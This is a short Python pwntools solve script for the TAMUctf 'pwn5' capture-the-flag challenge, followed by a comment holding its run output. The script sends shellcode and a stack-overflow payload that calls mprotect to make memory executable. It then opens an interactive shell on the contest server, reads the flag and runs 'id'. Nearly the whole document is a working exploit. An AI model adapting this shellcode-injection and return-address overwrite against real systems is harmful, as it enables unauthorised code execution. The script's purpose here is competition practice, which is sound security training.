from pwn import *

e = ELF("./pwn5")
p = remote("pwn.ctf.tamu.edu", 4325)

p.sendline(flat(asm(shellcraft.sh())))
p.sendline("aa")
p.sendline("aa")
p.sendline("y")
p.sendline("2")

p.sendline("A"*0x1C + "A"*4 + flat(e.symbols["mprotect"], 0x080F1A20, 0x080F1000, 0x1000, 0x7))

p.interactive()

'''
shgroup@SH-Group:/mnt/e/Writeup/ctf/TAMUctf/pwnable/pwn5$ python solve.py
[*] '/mnt/e/Writeup/ctf/TAMUctf/pwnable/pwn5/pwn5'
    Arch:     i386-32-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x8048000)
[+] Opening connection to pwn.ctf.tamu.edu on port 4325: Done
[*] Switching to interactive mode
$ ls
flag.txt
pwn5
sh
$ cat flag.txt
gigem{r37urn_0f_7h3_pwn}
$ id
uid=1000(pwnuser) gid=1001(pwnuser) groups=1001(pwnuser),1000(ctf)
$
'''